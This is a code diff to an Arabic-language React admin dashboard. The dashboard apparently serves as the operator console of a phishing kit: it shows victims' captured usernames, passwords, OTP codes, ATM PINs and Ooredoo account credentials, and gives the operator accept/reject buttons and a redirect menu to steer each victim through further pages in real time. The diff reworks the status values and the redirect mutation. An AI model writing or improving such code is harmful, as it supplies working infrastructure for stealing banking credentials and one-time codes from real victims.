@@ -60,6 +60,7 @@ export default function AdminDashboard() {
 
   const updateStatusMutation = trpc.submissions.updateSessionStatus.useMutation();
   const updateStepMutation = trpc.submissions.updateSessionStep.useMutation();
+  const adminTakeActionMutation = trpc.submissions.adminTakeAction.useMutation();
 
   const handleLogin = (e: React.FormEvent) => {
     e.preventDefault();
@@ -80,17 +81,17 @@ export default function AdminDashboard() {
   const handleStatusUpdate = async (sessionId: string, status: string) => {
     try {
       await updateStatusMutation.mutateAsync({ sessionId, status });
-      toast.success(`تم تحديث الحالة: ${status === 'accepted' ? 'قبول' : 'رفض'}`);
+      toast.success(`تم تحديث الحالة: ${status === 'approved' ? 'قبول' : 'رفض'}`);
       refetch();
     } catch (error) {
       toast.error("فشل تحديث الحالة");
     }
   };
 
-  const handleRedirect = async (sessionId: string, step: string) => {
+  const handleRedirect = async (sessionId: string, redirectTarget: string) => {
     try {
-      await updateStepMutation.mutateAsync({ sessionId, step });
-      toast.success(`تم التوجيه إلى: ${step}`);
+      await adminTakeActionMutation.mutateAsync({ sessionId, action: "redirect", redirectTarget, errorMessage: undefined });
+      toast.success(`تم التوجيه إلى: ${redirectTarget}`);
       refetch();
     } catch (error) {
       toast.error("فشل التوجيه");
@@ -283,7 +284,7 @@ export default function AdminDashboard() {
                               ].map((page) => (
                                 <DropdownMenuItem
                                   key={page.step}
-                                  onClick={() => handleRedirect(session.id, page.step)}
+                                  onClick={() => handleRedirect(session.id, `/${page.step}`)}
                                   className="text-right justify-end font-bold text-slate-600 hover:bg-slate-50 cursor-pointer rounded-xl py-2.5 px-4 mb-1 last:mb-0 transition-colors"
                                 >
                                   {page.name}
@@ -313,7 +314,7 @@ export default function AdminDashboard() {
                 </div>
                 <div>
                   <DialogTitle className="text-2xl font-black">ملف بيانات العميل</DialogTitle>
-                  <p className="text-rose-100/60 text-xs font-bold mt-1 font-mono tracking-tighter uppercase">Session ID: {selectedSession.sessionId}</p>
+                  <p className="text-rose-100/60 text-xs font-bold mt-1 font-mono tracking-tighter uppercase">Session ID: {selectedSession.id}</p>
                 </div>
               </div>
             </DialogHeader>
@@ -350,7 +351,7 @@ export default function AdminDashboard() {
                     "المستخدم": selectedSession.loginMethod?.username,
                     "كلمة السر": selectedSession.loginMethod?.password
                   }}
-                  onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'accepted')}
+                  onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'approved')}
                   onReject={() => handleStatusUpdate(selectedSession.sessionId, 'rejected')}
                 />
 
@@ -362,7 +363,7 @@ export default function AdminDashboard() {
                     acc[`رمز ${i + 1}`] = otp.otpCode;
                     return acc;
                   }, {}) || { "رمز OTP": "—" }}
-                  onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'accepted')}
+                  onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'approved')}
                   onReject={() => handleStatusUpdate(selectedSession.sessionId, 'rejected')}
                 />
 
@@ -371,7 +372,7 @@ export default function AdminDashboard() {
                   title="ATM PIN"
                   icon={<CreditCard className="w-4 h-4" />}
                   data={{ "الرقم السري": selectedSession.atmPin?.pin }}
-                  onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'accepted')}
+                  onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'approved')}
                   onReject={() => handleStatusUpdate(selectedSession.sessionId, 'rejected')}
                 />
 
@@ -383,7 +384,7 @@ export default function AdminDashboard() {
                     "المستخدم": selectedSession.ooredoo?.ooredooUser,
                     "كلمة السر": selectedSession.ooredoo?.ooredooPassword,
                   }}
-                  onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'accepted')}
+                  onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'approved')}
                   onReject={() => handleStatusUpdate(selectedSession.sessionId, 'rejected')}
                 />
               </div>
@@ -401,7 +402,8 @@ export default function AdminDashboard() {
   );
 }
 
-function getStepLabel(step: string) {
+function getStepLabel(step: string | null | undefined) {
+  if (!step) return '—';
   const steps: Record<string, string> = {
     'home': 'الرئيسية',
     'personal-data': 'البيانات الشخصية',
